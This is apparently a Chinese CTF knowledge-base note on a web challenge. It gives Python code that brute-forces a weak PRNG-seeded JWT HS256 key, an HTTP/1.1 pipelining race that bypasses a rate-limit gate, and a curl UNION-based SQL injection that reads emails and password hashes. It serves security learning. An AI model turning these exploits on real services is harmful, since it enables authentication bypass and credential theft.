---
title: JWT HS256 PRNG 密钥 + HTTP Pipeline 竞态绕过限流
category: web
tags: [jwt, hs256, prng, xorshift32, http-pipeline, race-condition, sqli, nodejs]
triggers: [JWT HS256, Xorshift32 PRNG, HTTP Pipeline, 竞态条件, Node.js async, gate bypass, 京麒CTF, 爆破JWT密钥, 22-bit seed, 4M枚举]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/Cairn-Desk-JWT-HS256-PRNG-Pipeline-Race.md]
---

## Summary

内部 JWT HS256 签名密钥由 22-bit Xorshift32 PRNG 种子生成（仅 4,194,304 种可能），可暴力枚举。通过 HTTP/1.1 Pipeline 单 TCP 连接一次性发送所有请求，在 async handler 让出事件循环前全部读取 gate counter=0，绕过限流。

## 关键考点

1. JWT HS256 弱密钥 — 22-bit Xorshift32 PRNG 种子暴力枚举
2. HTTP/1.1 Pipeline 单连接竞态绕过 per-IP gate 限流
3. SQL 注入 — UNION 查询读库 / 多语句写库

## Xorshift32 PRNG 种子还原

```python
class Xorshift32:
    def __init__(self, seed):
        self.state = seed & 0xFFFFFFFF
    def next(self):
        x = self.state
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5)  & 0xFFFFFFFF
        self.state = x & 0xFFFFFFFF
        return self.state

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

def gen_secret(seed):
    rng = Xorshift32(seed)
    return ''.join(ALPHABET[rng.next() % 64] for _ in range(32))
```

## HTTP Pipeline 竞态

```python
def exploit_pipeline(host, port, tokens, timeout_val=10):
    socks = []
    for i in range(0, len(tokens), PIPELINE_BATCH):
        batch_tokens = tokens[i:i+PIPELINE_BATCH]
        body = ""
        for t in batch_tokens:
            body += f"GET /api/backend/flag HTTP/1.1\r\nHost: {host}:{port}\r\nX-Internal-Auth: {t}\r\nConnection: keep-alive\r\n\r\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout_val)
        sock.connect((host, port))
        sock.sendall(body.encode())
        socks.append((sock, batch_tokens))
    # 逐个读取响应
    for sock, batch_tokens in socks:
        data = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk: break
                data += chunk
            except: break
```

## 核心命令

```bash
# UNBOUNDED pipeline (fresh gate 上 50 个全部绕过)
python3 exploit.py <host> <port> --start 0 --count 50

# 分片调度：每轮 5000 seed，跑完重启容器
docker restart cairn-desk-ctf-cairn-desk-1
sleep 15
python3 exploit.py localhost 3000 --start <offset> --count 5000

# SQL 注入读 users 表
curl -b cookie "http://host:port/support?q=' UNION SELECT 99,email,password_hash,theme FROM users--"
```

## 解题误区

- 试图用 SQL 注入 DROP TABLE — `db.exec()` 返回 400 被 try/catch 捕获
- 并发连接（多个 TCP 同时发包）— Node.js 事件循环按顺序处理每个连接，无法绕过 gate
- 一次性 pipeline 5000 个请求 — 1.4MB 数据导致 TCP 缓冲区满
- X-Forwarded-For 头 — 使用 `socket.remoteAddress` 而非头

## Connections

- **Related:** [[flask-ssti-session-forgery]] — Session 伪造（JWT 类似）
- **Related:** [[ghsa-ssrf-auth-bypass]] — 认证绕过 + JWT 安全
- **Related:** [[http-request-smuggling]] — HTTP 请求走私（类似 Pipeline 概念）
- **Source:** [ctf-kb/web/Cairn-Desk-JWT-HS256-PRNG-Pipeline-Race.md](file:///c:/Users/ZZH/.trae/ctf-kb/web/Cairn-Desk-JWT-HS256-PRNG-Pipeline-Race.md)
